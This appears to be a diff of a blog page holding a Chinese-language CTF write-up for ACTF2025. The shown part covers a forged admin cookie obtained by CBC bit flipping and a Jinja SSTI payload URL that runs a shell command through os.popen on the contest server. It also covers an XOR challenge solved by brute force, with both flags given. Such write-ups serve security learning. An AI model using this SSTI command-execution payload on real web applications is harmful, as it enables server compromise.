+<p>运行后得到修改过的admin cookie：lbMPnO/pCKxiQCngY7FBnojTAeRP24UGEKBhzBxwYouWi1aTTOJe11vwOY1wRTeZA+sZ79dvS9uGLb5njipH93C2etLyrsa8fVwWBdb+woDP3X9u20oiUvThWOy9CVpa，改一下成功进入管理员用户页面</p>
+<p>结合上述再利用SSTI漏洞构造payload得到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://oj-10-30-15-1-57207.adworld.xctf.org.cn/home?payload=&#123;&#123;lipsum._globals__.os.popen(%22grep%20-r%20%27ACTF&#123;%27%22).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ACTF&#123;n3vEr_imPlem3nT_SuCh_Iv_HIJacK4b13_C00kie&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="二-signin"><a class="markdownIt-Anchor" href="#二-signin"></a> 二、signin</h2>
+<p>描述：X0r is just a commonly used simple encryption</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ys~xdg/m@]mjkz@vl@z~lf&gt;b</span><br></pre></td></tr></table></figure>
+<p>直接用cyberchef的xor brute force模块秒了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;x0r_Brute_is_easy!&#125;</span><br></pre></td></tr></table></figure>
+<p>休息一下再做吧别催了QAQ</p>
 
     </div>
     <footer class="article-footer">
         <blockquote class="article-copyright">
     <p><strong><span class="icon-user icon"></span>Author: </strong>Cl1ck-t0</p>
-    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/02/19/pop%E9%93%BE%E6%9E%84%E9%80%A0/">https://cl1ck-t0.github.io/2026/02/19/pop%E9%93%BE%E6%9E%84%E9%80%A0/</a></p>
+    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/07/14/ACTF2025/">https://cl1ck-t0.github.io/2026/07/14/ACTF2025/</a></p>
     
-    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-02-19 16:41:25</p>
-    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-02-19 21:36:54</p>
+    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-07-14 16:18:43</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-07-14 17:02:51</p>
     <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
     <span class="icon-creative-commons article-copyright-bg"></span>
   </blockquote>
         <div class="share-wrapper">
-    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2026%2F02%2F19%2Fpop%25E9%2593%25BE%25E6%259E%2584%25E9%2580%25A0%2F&amp;appkey=&amp;title=pop%E9%93%BE%E6%9E%84%E9%80%A0&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="pop链构造">
+    <a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fcl1ck-t0.github.io%2F2026%2F07%2F14%2FACTF2025%2F&amp;appkey=&amp;title=ACTF2025&amp;pic=&amp;ralateUid=" target="_blank" rel="noopener noreferrer" title="ACTF2025">
       <div class="share-icon icon icon-weibo">
       </div>
     </a>
-    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=pop%E9%93%BE%E6%9E%84%E9%80%A0&amp;desc=pop%E9%93%BE%E6%9E%84%E9%80%A0&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="pop链构造">
+    <a href="https://connect.qq.com/widget/shareqq/index.html?url=www.baidu.com&amp;title=ACTF2025&amp;desc=ACTF2025&amp;source=https%3A%2F%2Fcl1ck-t0.github.io" target="_blank" rel="noopener noreferrer" title="ACTF2025">
       <div class="share-icon icon icon-qq">
       </div>
     </a>
-    <a href="javascript:;"  title="pop链构造">
+    <a href="javascript:;"  title="ACTF2025">
       <div class="share-icon icon icon-weixin">
           <div id="share-weixin">
             <div class="share-weixin-dom">
@@ -344,25 +307,17 @@
     </a>
 </div>
       
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E/" rel="tag" title="web漏洞">web漏洞</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/ACTF2025/" rel="tag" title="ACTF2025">ACTF2025</a></li></ul>
 
     </footer>
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
-      <div class="article-nav-link-wrap left">
-            <img data-src="/covers/pd-image.png" data-sizes="auto" alt="CRT" class="lazyload">
-        <a href="/2026/02/24/CRT/" aria-label="Prev: CRT" title="Prev: CRT"></a>
-        <div class="article-nav-caption">Prev</div>
-        <h3 class="article-nav-title">
-            CRT
-        </h3>
-      </div>
     <div class="article-nav-link-wrap right">
-          <img data-src="/covers/firefly-honkai-star-3840x2160-21360.jpg" data-sizes="auto" alt="RCE漏洞原理及利用" class="lazyload">
-      <a href="/2026/02/15/RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/" aria-label="Next: RCE漏洞原理及利用"  title="Next: RCE漏洞原理及利用"></a>
+          <img data-src="/covers/furina-neuvillette-3840x2160-19462.jpg" data-sizes="auto" alt="burp靶场漏洞实战" class="lazyload">
+      <a href="/2026/03/31/burp%E9%9D%B6%E5%9C%BA%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98/" aria-label="Next: burp靶场漏洞实战"  title="Next: burp靶场漏洞实战"></a>
       <div class="article-nav-caption">Next</div>
       <h3 class="article-nav-title">
-          RCE漏洞原理及利用
+          burp靶场漏洞实战
       </h3>
     </div>
   </nav>
@@ -432,7 +387,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pop%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">1.</span> <span class="toc-text"> pop链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#egswpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bpop"><span class="toc-number">1.1.</span> <span class="toc-text"> eg.[SWPUCTF 2021 新生赛]pop</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#actf2025%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text"> ACTF2025解题记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-not-so-web-1"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、not-so-web-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-signin"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、signin</span></a></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -565,13 +520,13 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "Cl1ck-t0",
-          title: "pop链构造",
-          url: "https://cl1ck-t0.github.io/2026/02/19/pop%E9%93%BE%E6%9E%84%E9%80%A0/",
+          title: "ACTF2025",
+          url: "https://cl1ck-t0.github.io/2026/07/14/ACTF2025/",
           excerpt: "",
           description: "",
-          stripContent: " pop链构造 在PHP反序列化漏洞利用中，POP链（Property Oriented Programming Chain） 是通过魔术方法的自动触发机制，将多个类的方法串联起来，最终执行恶意代码的攻击链。核心思路是：找到入口 → 确定尾巴 → 构建中间桥梁。 1. 明确入口与尾巴  入口：常见为 __wakeup()、__destruct() 等在反序列化或对象销毁时自动调用的方法。 尾巴：包含危险函数的代码位置，如 eval()、system()、file_put_contents()、i",
-          date: "Thu Feb 19 2026 16:41:25 GMT+0800",
-          updated: "Thu Feb 19 2026 21:36:54 GMT+0800",
+          stripContent: " ACTF2025解题记录 复健ing ACTF部分简单题做一下试试(实则难题碰都不敢碰QAQ)  一、not-so-web-1 ps:出题者说有手就行而我还搞了半天QAQ 题目描述：A (crypto) wolf in (web) sheep’s clothing 实则就是融合了crypto和web的内容，本题考点为SSTI漏洞和CBC翻转： 12345678910from Crypto.Cipher import AESfrom Crypto.Util.Padding import pad,",
+          date: "Tue Jul 14 2026 16:18:43 GMT+0800",
+          updated: "Tue Jul 14 2026 17:02:51 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
